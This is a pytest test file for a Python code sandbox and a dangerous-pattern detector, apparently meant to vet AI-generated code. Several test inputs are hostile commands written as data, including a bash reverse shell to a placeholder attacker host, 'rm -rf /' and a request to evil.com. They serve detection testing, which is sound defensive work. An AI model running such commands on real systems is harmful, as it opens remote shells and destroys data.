"""tests/test_ai_tool_sandbox.py

Tests for the new ai_sandbox module: RealDangerousPatternDetector
and SubprocessSandbox.
"""
from __future__ import annotations

import sys
import time
from pathlib import Path

# Make the project root importable
sys.path.insert(0, str(Path(__file__).resolve().parents[1]))

from tools.ai_sandbox import (
    PatternSeverity,
    RealDangerousPatternDetector,
    SafetyReport,
    SandboxConfig,
    SandboxResult,
    SubprocessSandbox,
    analyze_code,
    run_sandboxed,
)


# ---------------------------------------------------------------------------
# Detector tests
# ---------------------------------------------------------------------------


def test_detector_clean_code_is_safe():
    detector = RealDangerousPatternDetector()
    code = "x = 1 + 2\nprint(x)\n"
    report = detector.analyze(code)
    assert report.is_safe
    assert not report.has_critical()
    assert report.summary() == "OK (no dangerous patterns detected)"


def test_detector_syntax_error_marks_unsafe():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("def foo(:\n")
    assert report.syntax_error is not None
    assert not report.is_safe


def test_detector_catches_eval():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("eval('1+1')\n")
    assert not report.is_safe
    assert any(h.pattern_id == "dangerous_builtin" for h in report.hits)


def test_detector_catches_exec():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("exec('print(1)')\n")
    assert not report.is_safe
    assert any(h.pattern_id == "dangerous_builtin" for h in report.hits)


def test_detector_catches_os_import():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("import os\n")
    assert not report.is_safe
    assert any("os" in h.description for h in report.hits)


def test_detector_catches_subprocess_import():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("from subprocess import run\n")
    assert not report.is_safe
    assert any("subprocess" in h.description for h in report.hits)


def test_detector_catches_socket_import():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("import socket\n")
    assert not report.is_safe


def test_detector_catches_dunder_access():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("x = obj.__class__.__mro__\n")
    # dunder access is flagged at HIGH severity (a warning, not a critical block)
    assert any(h.pattern_id == "dunder_access" for h in report.hits)


def test_detector_allow_dangerous_imports_disables_flag():
    detector = RealDangerousPatternDetector(allow_dangerous_imports=True)
    report = detector.analyze("import os\n")
    # import is allowed but other dangerous calls would still flag
    assert all("os" not in h.description or h.severity != PatternSeverity.CRITICAL
               for h in report.hits if h.pattern_id == "dangerous_import")


def test_detector_allow_eval_exec_disables_flag():
    detector = RealDangerousPatternDetector(allow_eval_exec=True)
    report = detector.analyze("eval('1+1')\n")
    assert all(h.pattern_id != "dangerous_builtin" for h in report.hits)


def test_detector_catches_subprocess_call_in_code():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("subprocess.run(['ls'])\n")
    assert not report.is_safe
    assert any(h.pattern_id == "subprocess_call" for h in report.hits)


def test_detector_catches_network_call():
    detector = RealDangerousPatternDetector(allow_network=False)
    report = detector.analyze("import requests\nrequests.get('http://evil.com')\n")
    # network is flagged at HIGH severity by default
    assert any(h.pattern_id == "network_call" for h in report.hits)
    # also flag the import of requests (dangerous module) at CRITICAL
    assert any(h.pattern_id == "dangerous_import" for h in report.hits)
    # the dangerous_import makes is_safe False
    assert not report.is_safe


def test_detector_allow_network_disables_network_flag():
    detector = RealDangerousPatternDetector(allow_network=True)
    report = detector.analyze("import requests\nrequests.get('http://evil.com')\n")
    # import is still flagged as dangerous unless allowed
    network_hits = [h for h in report.hits if h.pattern_id == "network_call"]
    assert len(network_hits) == 0


def test_detector_catches_reverse_shell_token():
    detector = RealDangerousPatternDetector()
    code = 'os.system("bash -i >& /dev/tcp/attacker/443 0>&1")\n'
    report = detector.analyze(code)
    assert not report.is_safe


def test_detector_catches_rm_rf_token():
    detector = RealDangerousPatternDetector()
    code = 'os.system("rm -rf /")\n'
    report = detector.analyze(code)
    assert not report.is_safe


def test_detector_function_calls_recorded():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("print('hi')\nlen([1,2,3])\n")
    assert "print" in report.function_calls
    assert "len" in report.function_calls


def test_detector_imports_recorded():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("import json\nfrom pathlib import Path\n")
    assert "json" in report.imports
    assert "pathlib" in report.imports


def test_detector_by_severity_helper():
    detector = RealDangerousPatternDetector()
    report = detector.analyze(
        "import os\nos.system('ls')\nx = obj.__class__\n"
    )
    by_high = report.by_severity(PatternSeverity.HIGH)
    assert all(h.severity == PatternSeverity.HIGH for h in by_high)


def test_detector_summary_contains_counts():
    detector = RealDangerousPatternDetector()
    report = detector.analyze("import os\n")
    summary = report.summary()
    assert "Hits" in summary
    assert "critical=" in summary


def test_detector_handles_dynamic_call():
    """Calls to unknown callables should not crash."""
    detector = RealDangerousPatternDetector()
    code = "x = (lambda: 1)()\n"
    report = detector.analyze(code)
    assert report.is_safe


# ---------------------------------------------------------------------------
# Sandbox execution tests
# ---------------------------------------------------------------------------


def test_sandbox_clean_code_runs():
    sandbox = SubprocessSandbox(config=SandboxConfig(timeout_seconds=10))
    result = sandbox.run("print('hello world')\n")
    assert result.returncode == 0
    assert "hello world" in result.stdout
    assert result.success


def test_sandbox_captures_stdout_and_stderr():
    sandbox = SubprocessSandbox(config=SandboxConfig(timeout_seconds=10))
    code = "import sys\nprint('out'); print('err', file=sys.stderr)\n"
    result = sandbox.run(code)
    assert result.returncode == 0
    assert "out" in result.stdout
    assert "err" in result.stderr


def test_sandbox_refuses_critical_violation():
    sandbox = SubprocessSandbox()
    code = "import os\nos.system('echo pwned')\n"
    result = sandbox.run(code)
    assert not result.success
    assert result.error == "critical_violations"
    assert "pwned" not in result.stdout


def test_sandbox_refuses_eval():
    sandbox = SubprocessSandbox()
    code = "eval('1+1')\n"
    result = sandbox.run(code)
    assert not result.success
    assert result.error == "critical_violations"


def test_sandbox_refuses_syntax_error():
    sandbox = SubprocessSandbox()
    result = sandbox.run("def broken(:\n")
    assert not result.success
    assert result.error == "syntax_error"


def test_sandbox_times_out_on_infinite_loop():
    cfg = SandboxConfig(timeout_seconds=2, cpu_time_seconds=5)
    sandbox = SubprocessSandbox(config=cfg)
    code = "while True: pass\n"
    result = sandbox.run(code)
    assert result.timed_out or not result.success
    assert result.duration_seconds <= 10  # Some slack


def test_sandbox_runs_python_expression_and_prints():
    code = "x = 1 + 2 + 3\nprint(x * 2)\n"
    sandbox = SubprocessSandbox(config=SandboxConfig(timeout_seconds=5))
    result = sandbox.run(code)
    assert result.returncode == 0
    assert "12" in result.stdout


def test_sandbox_args_passed_via_argv():
    code = "import sys\nprint(sys.argv[1:])\n"
    sandbox = SubprocessSandbox(config=SandboxConfig(timeout_seconds=5))
    result = sandbox.run(code, args=["hello", "world"])
    assert result.returncode == 0
    assert "hello" in result.stdout
    assert "world" in result.stdout


def test_sandbox_exception_in_code_returns_nonzero():
    code = "raise ValueError('boom')\n"
    sandbox = SubprocessSandbox(config=SandboxConfig(timeout_seconds=5))
    result = sandbox.run(code)
    assert not result.success
    assert "ValueError" in result.stderr or "boom" in result.stderr


def test_sandbox_to_dict_serializable():
    sandbox = SubprocessSandbox()
    result = sandbox.run("print('ok')\n")
    d = result.to_dict()
    assert d["success"] is True
    assert d["returncode"] == 0
    assert "ok" in d["stdout"]


def test_sandbox_config_defaults_sane():
    cfg = SandboxConfig()
    assert cfg.timeout_seconds > 0
    assert cfg.memory_limit_mb > 0
    assert cfg.cpu_time_seconds > 0


def test_sandbox_allow_network_flag_passes_env():
    """When network is allowed, the env marker is omitted."""
    # Use a detector that allows dangerous imports so the test code can use os
    from tools.ai_sandbox import RealDangerousPatternDetector
    detector = RealDangerousPatternDetector(
        allow_network=True,
        allow_dangerous_imports=True,
        allow_eval_exec=True,
    )
    cfg = SandboxConfig(allow_network=True)
    sandbox = SubprocessSandbox(config=cfg, detector=detector)
    # Code that just prints the env marker
    result = sandbox.run(
        "import os\n"
        "print('NET_BLOCKED' if os.environ.get('ELENGENIX_SANDBOX_NO_NETWORK') else 'NET_OK')\n"
    )
    assert result.returncode == 0
    assert "NET_OK" in result.stdout


def test_sandbox_no_network_sets_env_marker():
    from tools.ai_sandbox import RealDangerousPatternDetector
    detector = RealDangerousPatternDetector(
        allow_network=False,
        allow_dangerous_imports=True,
        allow_eval_exec=True,
    )
    cfg = SandboxConfig(allow_network=False)
    sandbox = SubprocessSandbox(config=cfg, detector=detector)
    result = sandbox.run(
        "import os\n"
        "print(os.environ.get('ELENGENIX_SANDBOX_NO_NETWORK', 'NO'))\n"
    )
    assert result.returncode == 0
    assert "1" in result.stdout


# ---------------------------------------------------------------------------
# Convenience facade tests
# ---------------------------------------------------------------------------


def test_analyze_code_helper():
    report = analyze_code("import os\n")
    assert not report.is_safe
    assert "Hits" in report.summary()


def test_run_sandboxed_helper():
    result = run_sandboxed("print(42)\n")
    assert result.returncode == 0
    assert "42" in result.stdout


if __name__ == "__main__":
    # Allow running as a script
    import pytest
    sys.exit(pytest.main([__file__, "-v"]))
